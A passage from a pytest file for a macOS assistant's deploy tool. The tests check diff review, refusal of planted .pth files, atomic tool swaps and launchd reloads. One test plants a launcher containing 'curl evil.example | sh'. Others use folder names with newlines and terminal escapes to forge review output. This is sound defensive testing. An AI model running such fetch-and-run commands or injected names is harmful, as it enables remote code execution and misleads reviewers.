    too: the deploy copies it from the place it takes the helper from."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    helper = repo / "vendor" / deploy.TUNNEL
    helper.parent.mkdir(parents=True)
    helper.write_text("helper")
    helper.with_name(helper.name + ".stamp").write_text("pr5_head=new\n")
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    copied = release / "vendor" / deploy.TUNNEL
    assert copied.read_text() == "helper"
    assert copied.with_name(copied.name + ".stamp").read_text() == "pr5_head=new\n"


def test_her_configs_java_build_is_read_as_her_by_its_folder_name(tmp_path: Path) -> None:
    """signal-07: root never reads her config; her release's Python reads [calls] signal_cli as her and names only a
    Java build's folder in a vendor/ (or nothing: the newest runs). A config not read is None: every build stays."""
    config = tmp_path / "config.toml"
    built = "/usr/local/estia/current/vendor/signal-cli-0.14.8-jvm/signal-cli-0.14.8/bin/signal-cli"
    config.write_text(f'[calls]\nsignal_cli = "{built}"\n', encoding="utf-8")
    assert deploy.read_call_build(config) == "signal-cli-0.14.8-jvm/signal-cli-0.14.8"
    config.write_text('[calls]\nsignal_cli = "/opt/homebrew/bin/signal-cli"\n', encoding="utf-8")
    assert deploy.read_call_build(config) == ""
    config.write_text("[calls]\n", encoding="utf-8")
    assert deploy.read_call_build(config) == ""
    assert deploy.read_call_build(tmp_path / "missing.toml") is None
    config.write_text("[calls\n", encoding="utf-8")
    assert deploy.read_call_build(config) is None
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).her_call_build() == ""  # the fake release's Python says nothing
    assert any("--read-call-build" in argv for argv in mac.asked)


def test_a_jvm_signal_cli_without_a_java_to_copy_stops_the_deploy(tmp_path: Path) -> None:
    """Without a JDK in the release, her JVM signal-cli would run the Java macOS picks, perhaps a Homebrew keg the
    owner's account can change (review I32): the deploy stops before anything is built, with the fix."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo, jdk=False)
    said: list[str] = []
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, health=False, said=said).run() == 1
    line = next(line for line in said if line.startswith("✗"))
    assert "no Java to copy for the JVM signal-cli" in line and "brew install openjdk" in line, line
    assert not (root / "usr/local/estia/current").exists() and not any(UV in argv for argv in mac.asked)


def test_no_java_is_copied_without_the_jvm_signal_cli(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False, brew=homebrew(tmp_path)).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert (release / "vendor/signal-cli-native/bin/signal-cli").is_file()
    assert not (release / "vendor/openjdk.jdk").exists()


def test_a_failing_build_step_says_why(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root, fails="uv"), clock, health=False, said=said).run() == 1
    assert any("network unreachable" in line for line in said)
    assert list((root / "usr/local/estia/releases").iterdir()) == []  # nothing left


# the root-run tools: never code from the release, updated only after their diff was shown


def test_the_first_deploy_installs_the_root_run_tools(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    tools = code / "tools"
    assert (tools / "src/local_assistant/deploy.py").read_text() == "# deploy\n"
    assert (tools / "launchd/com.local-assistant.bridge.plist.in").is_file()
    assert (tools / "python3").is_symlink() and (tools / "python3").resolve().is_file()
    assert (tools / "python3").resolve().is_relative_to(tools.resolve())  # its own copy, not the release's
    assert (code / "bin/estia").read_text() == (tools / "scripts/estia").read_text() == "#!/bin/bash\necho estia\n"
    assert json.loads((tools / "tools.json").read_text())["release"] == (code / "current").resolve().name


def tool_modules() -> list[str]:
    return [rel for rel in deploy.TOOL_FILES if rel.startswith("src/") and rel.endswith(".py")]


@pytest.mark.parametrize("rel", tool_modules())
def test_the_root_run_tools_import_only_themselves_and_the_standard_library(rel: str) -> None:
    """Root runs /usr/local/estia/tools with only TOOL_FILES in it: an import of any other module of ours (inside a
    function too) would break every estia-deploy, rollback, remove-old and account once --update-tools took it, with
    no command left to repair it (review I16)."""
    ours = {path.removeprefix("src/").removesuffix(".py").replace("/", ".") for path in tool_modules()}
    ours = {name.removesuffix(".__init__") for name in ours}
    names = {name.rsplit(".", 1)[-1] for name in ours if "." in name}
    for node in ast.walk(ast.parse((ROOT / rel).read_text(encoding="utf-8"))):
        if isinstance(node, ast.Import):
            for alias in node.names:
                top = alias.name.split(".")[0]
                assert alias.name in ours or top in sys.stdlib_module_names, (rel, alias.name)
        elif isinstance(node, ast.ImportFrom):
            assert node.level == 0 and node.module, (rel, ast.dump(node))
            top = node.module.split(".")[0]
            assert node.module in ours or top in sys.stdlib_module_names or top == "__future__", (rel, node.module)
            if node.module == "local_assistant":
                assert {alias.name for alias in node.names} <= names, (rel, [a.name for a in node.names])


def test_tools_that_do_not_import_are_never_installed(tmp_path: Path) -> None:
    """--update-tools checks the new tools with their own Python and only their own files before the swap; a
    failure keeps the installed ones whole and says why (review I16)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "src/local_assistant/ownuser.py", "from local_assistant import config\n", "an import root lacks")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    mac = FakeMac(root)
    mac.imports = (1, "ImportError: cannot import name 'config' from 'local_assistant'\n")
    said: list[str] = []
    assert deployment(root, repo, mac, clock, health=False, said=said).update_tools() == 1
    assert (code / "tools/src/local_assistant/ownuser.py").read_text() == "# ownuser\n"  # the installed ones stay
    assert (code / "tools/python3").resolve().is_file()
    assert not (code / ".tools.new").exists() and not (code / ".tools.old").exists()
    assert any(line.startswith("✗") and "cannot import name 'config'" in line for line in said), said
    check = next(argv for argv in mac.asked if argv[0].endswith("/python3"))
    new = code / ".tools.new"
    assert check[0] == str(new / "python3") and check[1:3] == ("-I", "-c") and check[-1] == str(new / "src")


@pytest.mark.parametrize("name", ["scripts/estia", "scripts/estia-deploy"])
def test_shell_tools_that_bash_cannot_read_are_never_installed(tmp_path: Path, name: str) -> None:
    """A broken estia-deploy left no way to update, and a broken estia none to stop her: each shell tool is read by
    bash (-n) before the swap, and one it cannot read keeps the installed tools (release review D5)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, name, "#!/bin/bash\nif then fi\n", "a shell tool bash cannot read")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    mac = FakeMac(root)
    said: list[str] = []
    assert deployment(root, repo, mac, clock, health=False, said=said).update_tools() == 1
    assert (code / "tools" / name).read_text() == (code / "bin" / Path(name).name).read_text()
    assert "if then fi" not in (code / "tools" / name).read_text()
    assert not (code / ".tools.new").exists()
    assert any(line.startswith("✗") and name in line and "bash" in line for line in said), said
    assert (deploy.BASH, "-n", str(code / ".tools.new" / name)) in mac.asked


def test_the_new_tools_take_the_old_ones_place_in_one_step(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Two renames (the old tools aside, the new ones in) left a moment with no tools at all: a stop there (a power
    cut) left estia-deploy, rollback, remove-old and account with nothing to run, and no command to repair it. The
    whole new tree swaps names with the old one in one step (review I16)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "scripts/estia", "# estia, changed\n", "a wrapper change")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    rename = os.rename

    def cut_after(source: str | Path, target: str | Path) -> None:
        rename(source, target)
        if Path(source) == code / "tools":
            raise KeyboardInterrupt("power cut")

    monkeypatch.setattr(os, "rename", cut_after)
    with contextlib.suppress(KeyboardInterrupt):
        deployment(root, repo, FakeMac(root), clock, health=False).update_tools()
    assert (code / "tools/python3").resolve().is_file()
    assert (code / "tools/scripts/estia").read_text() == "# estia, changed\n"
    assert not (code / ".tools.new").exists() and not (code / ".tools.old").exists()


def test_a_volume_that_cannot_swap_names_takes_the_new_tools_by_two_renames(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "scripts/estia", "# estia, changed\n", "a wrapper change")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0

    def cannot(first: Path, second: Path) -> None:
        raise OSError(45, "Operation not supported", str(first))

    monkeypatch.setattr(deploy, "swap_names", cannot)
    assert deployment(root, repo, FakeMac(root), clock, health=False).update_tools() == 0
    code = root / "usr/local/estia"
    assert (code / "tools/scripts/estia").read_text() == "# estia, changed\n"
    assert (code / "tools/python3").resolve().is_file()
    assert not (code / ".tools.new").exists() and not (code / ".tools.old").exists()


def test_swap_names_trades_two_folders_in_one_step(tmp_path: Path) -> None:
    first, second = tmp_path / "first", tmp_path / "second"
    for folder in (first, second):
        folder.mkdir()
        (folder / folder.name).write_text(folder.name)
    deploy.swap_names(first, second)
    assert [p.name for p in first.iterdir()] == ["second"] and [p.name for p in second.iterdir()] == ["first"]
    with pytest.raises(FileNotFoundError):
        deploy.swap_names(first, tmp_path / "none")


def test_update_tools_takes_the_releases_python_when_it_changed(tmp_path: Path) -> None:
    """The tools' Python was the first release's for good: a patch release of it is shown in the review and taken
    with the files (review I22)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    clock.now += 60
    mac = FakeMac(root)
    mac.python = "3.13.12"
    said: list[str] = []
    assert deployment(root, repo, mac, clock, health=False, said=said).run() == 0
    assert any("--update-tools" in line and "Python 3.13.9 → 3.13.12" in line for line in said), said
    said.clear()
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).update_tools() == 0
    assert any(line.startswith("  Python: 3.13.9 → 3.13.12 (the live release's, which your account") for line in said)
    assert [p.name for p in (code / "tools/python").iterdir()] == ["cpython-3.13.12-macos-aarch64-none"]
    assert (code / "tools/python3").resolve().is_file() and "3.13.12" in str((code / "tools/python3").resolve())
    said.clear()
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).update_tools() == 0
    assert any(line.startswith("✓ The root-run tools are those of the live release") for line in said), said


def site_packages(folder: Path, version: str = "3.13.9") -> Path:
    """The site-packages of the Python in `folder`/python (a release's or the tools' own), made when missing."""
    path = folder / f"python/cpython-{version}-macos-aarch64-none/lib/python3.13/site-packages"
    path.mkdir(parents=True, exist_ok=True)
    return path


def test_update_tools_keeps_their_own_python_while_its_version_is_the_same(tmp_path: Path) -> None:
    """Your account builds each release's Python (uv as you): with the same version, --update-tools keeps the tools'
    own copy, so a file added to the release's Python (a .pth, which Python runs at every start, -I too) never
    reaches root unseen (release review D1)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    (site_packages(code / "tools") / "kept.txt").write_text("the tools' own Python")
    commit(repo, "scripts/estia", "#!/bin/bash\necho changed\n", "change the wrapper")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    (site_packages((code / "current").resolve()) / "planted.pth").write_text("import os\n")
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).update_tools() == 0
    assert (code / "tools/scripts/estia").read_text() == "#!/bin/bash\necho changed\n"
    assert (site_packages(code / "tools") / "kept.txt").is_file()
    assert not (site_packages(code / "tools") / "planted.pth").exists()
    assert (code / "tools/python3").resolve().is_file()
    assert (code / "tools/python3").resolve().is_relative_to((code / "tools").resolve())
    assert not any("Python" in line for line in said if line.startswith("  ")), said


@pytest.mark.parametrize("name", ["planted.pth", "sitecustomize.py", "usercustomize.py"])
def test_a_new_python_with_a_file_it_runs_at_every_start_is_never_taken(tmp_path: Path, name: str) -> None:
    """A new version of the release's Python goes into the tools, which root runs: one holding a .pth file or a
    sitecustomize or usercustomize module (Python runs each at every start, with -I too) is refused before the
    question, and the installed tools stay (release review D1)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    clock.now += 60
    mac = FakeMac(root)
    mac.python = "3.13.12"
    assert deployment(root, repo, mac, clock, health=False).run() == 0
    (site_packages((code / "current").resolve(), "3.13.12") / name).write_text("import os\n")
    said: list[str] = []
    asked: list[str] = []
    update = deployment(root, repo, FakeMac(root), clock, health=False, said=said)

    def yes(question: str) -> bool:
        asked.append(question)
        return True

    update.confirm = yes
    assert update.update_tools() == 1
    assert asked == [], asked
    assert "3.13.9" in str((code / "tools/python3").resolve())
    assert any(line.startswith("✗") and f"site-packages/{name}" in line and "every start" in line for line in said)
    with pytest.raises(DeployError, match="every start"):
        update.install_tools((code / "current").resolve())
    assert "3.13.9" in str((code / "tools/python3").resolve()) and not (code / ".tools.new").exists()


def test_tools_without_a_python_of_their_series_are_never_installed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A deploy.py that moves to a new Python series runs as root from the tools: when the release holds no Python of
    that series, the tools stay whole (they had no python3 left before: review I22)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    code = root / "usr/local/estia"
    before = (code / "tools/python3").resolve()
    monkeypatch.setattr(deploy, "PYTHON_SERIES", "3.14")
    said: list[str] = []
    with pytest.raises(DeployError, match=r"no Python 3\.14"):
        deployment(root, repo, FakeMac(root), clock, health=False, said=said).install_tools(
            (code / "current").resolve()
        )
    assert (code / "tools/python3").resolve() == before and before.is_file()
    assert not (code / ".tools.new").exists()


def test_a_later_deploy_keeps_the_installed_tools_and_says_how_to_review_them(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "scripts/estia", "#!/bin/bash\necho changed\n", "change the wrapper")
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).run() == 0
    code = root / "usr/local/estia"
    assert (code / "bin/estia").read_text() == "#!/bin/bash\necho estia\n"  # root runs only reviewed tools
    assert any("--update-tools" in line and "scripts/estia" in line for line in said)


@pytest.mark.parametrize("yes", [True, False])
def test_update_tools_shows_the_diff_and_asks(tmp_path: Path, yes: bool) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "scripts/estia", "#!/bin/bash\necho changed\n", "change the wrapper")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    said: list[str] = []
    update = deployment(root, repo, FakeMac(root), clock, health=False, said=said, confirm=yes)
    assert update.update_tools() == (0 if yes else 1)
    assert "+echo changed" in said and "-echo estia" in said
    expected = "#!/bin/bash\necho changed\n" if yes else "#!/bin/bash\necho estia\n"
    assert (root / "usr/local/estia/bin/estia").read_text() == expected


def test_a_deploy_shows_the_new_commits_and_asks_first(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    live = (root / "usr/local/estia/current").resolve()
    commit(repo, "src/local_assistant/x.py", "x = 1\n", "feat: a new part")
    clock.now += 60
    said: list[str] = []
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, health=False, said=said, confirm=False).run() == 1
    text = "\n".join(said)
    assert "feat: a new part" in text and "src/local_assistant/x.py" in text
    assert (root / "usr/local/estia/current").resolve() == live
    assert not any(argv[0] == UV or UV in argv for argv in mac.asked)  # nothing built


def git(repo: Path, *argv: str) -> str:
    done = subprocess.run(
        ["git", "-c", "user.name=Alex Example", "-c", "user.email=alex@example.com", *argv],
        cwd=repo,
        check=True,
        capture_output=True,
        text=True,
    )
    return done.stdout.strip()


def test_a_long_review_says_what_it_leaves_out(tmp_path: Path) -> None:
    """The review showed 50 commits and 200 lines of files without a word about the rest, and git's own total line
    was cut off with them (release review D8)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    for n in range(60):
        (repo / f"docs/many/{n:03}.md").parent.mkdir(parents=True, exist_ok=True)
        (repo / f"docs/many/{n:03}.md").write_text(f"{n}\n")
        if n < 59:
            git(repo, "add", "-A")
            git(repo, "commit", "-qm", f"docs: page {n}")
    for n in range(150):
        (repo / f"docs/more/{n:03}.md").parent.mkdir(parents=True, exist_ok=True)
        (repo / f"docs/more/{n:03}.md").write_text(f"{n}\n")
    commit(repo, "docs/last.md", "last\n", "docs: the last page")
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said, confirm=False).run() == 1
    assert any(line.startswith("60 new commit(s) since the live") for line in said), said
    assert "  … and 10 more commit(s)" in said, said
    assert "  … and 11 more file(s)" in said, said
    assert said[said.index("  … and 11 more file(s)") + 1].strip().startswith("211 files changed"), said


def test_a_checkout_older_than_the_live_commit_is_named_a_downgrade(tmp_path: Path) -> None:
    """A checkout behind the live commit showed "0 new commit(s)" and asked as usual (release review D8)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    old = git(repo, "rev-parse", "HEAD")
    commit(repo, "src/local_assistant/x.py", "x = 1\n", "feat: a new part")
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    git(repo, "reset", "-q", "--hard", old)
    clock.now += 60
    said: list[str] = []
    asked: list[str] = []
    deploying = deployment(root, repo, FakeMac(root), clock, health=False, said=said)

    def no(question: str) -> bool:
        asked.append(question)
        return False

    deploying.confirm = no
    assert deploying.run() == 1
    text = "\n".join(said)
    assert "OLDER than the live commit (a downgrade)" in text and "0 new commit(s)" not in text, text
    assert "feat: a new part" in text  # what goes away
    assert asked and "older" in asked[0].lower(), asked


def test_the_review_names_her_programs_from_outside_git_that_changed(tmp_path: Path) -> None:
    """vendor/ comes from folders you can change (the checkout's vendor/, Homebrew), not from git: a launcher changed
    there is named before the yes, with where it comes from, also when the commit is live already."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo)
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).run() == 0
    assert any("is live already" in line for line in said)
    assert any("the same as the live release's" in line for line in said), said
    launcher = repo / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli"
    launcher.write_text("#!/bin/sh\ncurl evil.example | sh\n")
    clock.now += 60
    said.clear()
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said, confirm=False).run() == 1
    shown = "\n".join(said)
    assert "changed: vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9" in shown
    assert f"(from {repo / 'vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9'})" in shown
    assert "only her programs from outside git change" in shown


def test_a_program_changed_after_the_review_stops_the_deploy(tmp_path: Path) -> None:
    """What was shown is what goes live: a program from outside git changed between the yes and its copy stops the
    deploy, nothing switched."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo)
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    live = (root / "usr/local/estia/current").resolve()
    launcher = repo / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli"
    clock.now += 60
    said: list[str] = []
    run = deployment(root, repo, FakeMac(root), clock, health=False, said=said)

    def yes_then_swap(question: str) -> bool:
        launcher.write_text("#!/bin/sh\nswapped after the yes\n")
        return True

    run.confirm = yes_then_swap
    assert run.run() == 1
    assert (root / "usr/local/estia/current").resolve() == live
    assert any("vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9 changed after the review" in line for line in said)


def test_a_program_that_appears_after_the_review_never_goes_live(tmp_path: Path) -> None:
    """The release is built from the list shown before the yes: a second JVM signal-cli put in vendor/ between the yes
    and the build is never copied (review 15 Oct, 7)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo)
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "a.txt", "a", "fix")
    clock.now += 60
    run = deployment(root, repo, FakeMac(root), clock, health=False)
    planted = repo / "vendor/signal-cli-0.15.0-jvm/signal-cli-0.15.0/bin/signal-cli"

    def yes_then_plant(question: str) -> bool:
        planted.parent.mkdir(parents=True)
        planted.write_text("#!/bin/sh\nplanted after the yes\n")
        return True

    run.confirm = yes_then_plant
    assert run.run() == 0
    release = (root / "usr/local/estia/current").resolve()
    assert not (release / "vendor/signal-cli-0.15.0-jvm").exists()
    assert (release / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli").is_file()


def test_control_characters_in_commit_subjects_are_not_printed(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
    commit(repo, "a.txt", "a", "fix\x1b[2K\x1b[1Ahidden")
    clock.now += 60
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said, confirm=False).run() == 1
    assert not any("\x1b" in line for line in said)


@pytest.mark.parametrize("hidden", ["\n", "\t", "\r", "\x1b", "\x9b", "‮", "⁦", "​", "﻿", " ", " "])
def test_a_cleaned_field_stays_on_its_line_with_nothing_hidden(hidden: str) -> None:
    """FULL2: an owner-written name printed to root's terminal never starts a line, moves the cursor, turns text
    around (bidi overrides) or hides a character (zero-width): each is a "?"."""
    assert deploy.clean(f"vendor/a{hidden}b") == "vendor/a?b"


def test_a_cleaned_field_keeps_ordinary_letters() -> None:
    assert deploy.clean("~/estia-checkout ő, Ω, 李 (0.14.9+1)") == "~/estia-checkout ő, Ω, 李 (0.14.9+1)"


def test_a_vendor_item_with_an_escape_or_a_newline_in_its_name_stops_the_deploy(tmp_path: Path) -> None:
    """FULL2: a program of the owner's account names a folder in vendor/ so that the review prints a fake line and
    hides the rest. Only names like signal-cli-0.14.9-jvm/signal-cli-0.14.9 are taken: anything else stops the deploy
    before the question, named in escaped form, nothing built or switched."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    jvm_vendor(repo)
    planted = repo / "vendor/signal-cli-0\n  (nothing else changes)\x1b[8m-jvm/signal-cli-0/bin/signal-cli"
    planted.parent.mkdir(parents=True)
    planted.write_text("#!/bin/sh\n")
    said: list[str] = []
    asked: list[str] = []
    run = deployment(root, repo, FakeMac(root), clock, health=False, said=said)

    def yes(question: str) -> bool:
        asked.append(question)
        return True

    run.confirm = yes
    assert run.run() == 1
    shown = "\n".join(said)
    assert "\x1b" not in shown and "\n  (nothing else changes)" not in shown
    assert r"'signal-cli-0\n  (nothing else changes)\x1b[8m-jvm/signal-cli-0'" in shown, shown
    assert "deploy stopped, nothing switched" in shown
    assert not asked and not (root / "usr/local/estia/current").exists()


def test_the_checkout_and_where_her_programs_come_from_are_printed_cleaned(tmp_path: Path) -> None:
    """FULL2: the checkout's own path is the owner's to name: the first release's line and the vendor review's
    "(from …)" show it on one line, without escape sequences."""
    root, clock = tmp_path / "root", Clock()
    repo = checkout(tmp_path).rename(tmp_path / "estia\n✓ nothing else changes\x1b[8m")
    jvm_vendor(repo)
    said: list[str] = []
    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said, confirm=False).run() == 1
    shown = "\n".join(said)
    assert "\x1b" not in shown and "\n✓ nothing else changes" not in shown
    assert "First release from " in shown and shown.count("estia?✓ nothing else changes?[8m") >= 2, shown


def installed_plists(root: Path, *, voice: bool = False) -> Path:
    folder = root / "Library/LaunchDaemons"
    folder.mkdir(parents=True, exist_ok=True)
    for label in ("bridge", *(["voice"] if voice else [])):
        (folder / f"com.local-assistant.{label}.plist").write_text("old")
    return folder


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_each_deploy_renders_the_service_files_and_reloads_one_that_changed(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    folder = installed_plists(root, voice=True)
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).run() == 0
    bridge = folder / "com.local-assistant.bridge.plist"
    assert b"<string>_estia</string>" in bridge.read_bytes()
    assert b"<string>/var/log/estia/launchd.log</string>" in bridge.read_bytes()
    for name in ("launchd.log", "voice.log"):  # made before launchd opens them (an install from before moves here)
        assert (root / "var/log/estia" / name).is_file()
    assert (LAUNCHCTL, "bootout", "system/com.local-assistant.bridge") in mac.asked
    assert (LAUNCHCTL, "bootstrap", "system", "/Library/LaunchDaemons/com.local-assistant.bridge.plist") in mac.asked
    clock.now += 60
    again = FakeMac(root)
    assert deployment(root, repo, again, clock).run() == 0
    assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.bridge") in again.asked  # unchanged: a restart
    assert not any(argv[:2] == (LAUNCHCTL, "bootout") for argv in again.asked)
    assert not any(argv[-1] == "system/com.local-assistant.voice" for argv in again.asked)  # voice unchanged: left


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_log_folder_that_cannot_be_made_stops_the_deploy_before_the_switch(tmp_path: Path) -> None:
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    live = (root / "usr/local/estia/current").resolve()
    shutil.rmtree(root / "var/log/estia")
    (root / "var/log/estia").symlink_to(tmp_path)  # only root could do this on the Mac: refused all the same
    clock.now += 60
    said: list[str] = []
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock, said=said).run() == 1
    assert (root / "usr/local/estia/current").resolve() == live
    assert not any(argv[0] == LAUNCHCTL and argv[1] != "print" for argv in mac.asked)
    assert any(line.startswith("✗ deploy stopped, nothing switched: /var/log/estia") for line in said), said


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_a_second_name_her_account_gave_her_log_never_stops_the_deploy(tmp_path: Path) -> None:
    """`ln /var/log/estia/launchd.log ~/x` as her (the same volume): the deploy still goes live (review 15 Oct, 5)."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    live = (root / "usr/local/estia/current").resolve()
    os.link(root / "var/log/estia/launchd.log", tmp_path / "hers")
    commit(repo, "a.txt", "a", "fix")
    clock.now += 60
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    assert (root / "usr/local/estia/current").resolve() != live
    assert (root / "var/log/estia/launchd.log").stat().st_nlink == 1


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_an_unchanged_service_that_is_not_loaded_is_bootstrapped(tmp_path: Path) -> None:
    """A kickstart of a service launchd does not know fails: an unchanged service file that is not loaded (a failed
    try, a bootout by hand) is loaded again instead, and the rollback after a failed check does the same."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root)
    assert deployment(root, repo, FakeMac(root), clock).run() == 0
    clock.now += 60
    mac = FakeMac(root, loaded=set())
    assert deployment(root, repo, mac, clock).run() == 0
    bootstrap = (LAUNCHCTL, "bootstrap", "system", "/Library/LaunchDaemons/com.local-assistant.bridge.plist")
    assert bootstrap in mac.asked
    assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.bridge") not in mac.asked
    gone = FakeMac(root, loaded=set())  # the switch back after a failed check restarts the same way
    deployment(root, repo, gone, clock).restart()
    assert gone.asked[-1] == bootstrap


def voice_tree(repo: Path) -> str:
    done = subprocess.run(
        ["git", "rev-parse", "HEAD:tools/voice"], cwd=repo, capture_output=True, text=True, check=True
    )
    return done.stdout.strip()


@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
def test_the_voice_service_is_built_from_the_commits_own_sources(tmp_path: Path) -> None:
    """Never the checkout's own build (a dirty tree, another branch, an older pull): the commit's tools/voice, built
    as the owner with the exact versions in its Package.resolved; its binary and bundles kept, the build's own files
    not. release.json records the tree it came from."""
    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
    installed_plists(root, voice=True)
    mac = FakeMac(root)
    assert deployment(root, repo, mac, clock).run() == 0
    release = (root / "usr/local/estia/current").resolve()
    built = [argv for argv in mac.asked if deploy.SWIFT in argv and "voice-service" in argv]
    assert len(built) == 1 and built[0][:5] == (SUDO, "-u", ME, "-H", "--")
    assert built[0][built[0].index(deploy.SWIFT) :] == (
        deploy.SWIFT,
        "build",
        "-c",
        "release",
        "--force-resolved-versions",
        "--package-path",
        str(release / "tools/voice"),
        "--scratch-path",
        str(release / ".voice-build"),
        "--product",
        "voice-service",
    )
    binary = release / "tools/voice/.build/release/voice-service"
    assert binary.read_text() == "#!/bin/sh\n# built from: // the voice service\n" and os.access(binary, os.X_OK)
    assert sorted(p.name for p in binary.parent.iterdir()) == [
        "FluidAudio_FluidAudio.bundle",
        "voice-service",
        "voice-service_voice-service.bundle",  # its own: heart's voice file (owner, 27 Oct), never fetched
    ]
